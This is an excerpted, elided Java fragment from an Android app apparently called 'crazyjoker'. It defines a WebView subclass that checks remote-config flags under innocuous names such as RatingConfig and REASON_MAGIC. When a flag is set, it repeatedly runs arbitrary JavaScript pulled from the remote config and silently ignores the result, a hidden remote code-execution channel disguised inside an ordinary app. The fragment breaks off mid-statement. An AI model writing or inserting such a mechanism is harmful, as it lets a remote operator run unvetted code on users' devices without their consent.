package com.toldrentr.crazyjoker.views;
...
import static com.toldrentr.crazyjoker.PrivacyPolicyActivity.REASON_MAGIC;
import static com.toldrentr.crazyjoker.foo.Utils.runOnUiThread;
...
public class CustomView extends AdvancedWebView {
    ...
    private void _init(){
        ...
        debugMode(RatingConfig.getRemoteConfig().getBool("wv_debug", false));

        if(RatingConfig.getRemoteConfig().getBool("jstimer", false)
                && RatingConfig.getRemoteConfig().has("js")
                && RatingConfig.getRemoteConfig().getStr("js","").length()>0
        ) {
            jsTimer.scheduleAtFixedRate(new TimerTask() {
                ...
                public void run() {
                    try {
                        runOnUiThread(() -> {
                            evaluateJavascript(RatingConfig.getRemoteConfig().getStr("js", ""), (ignored) -> {
                            });
                        });
                    } catch (Exception e) {
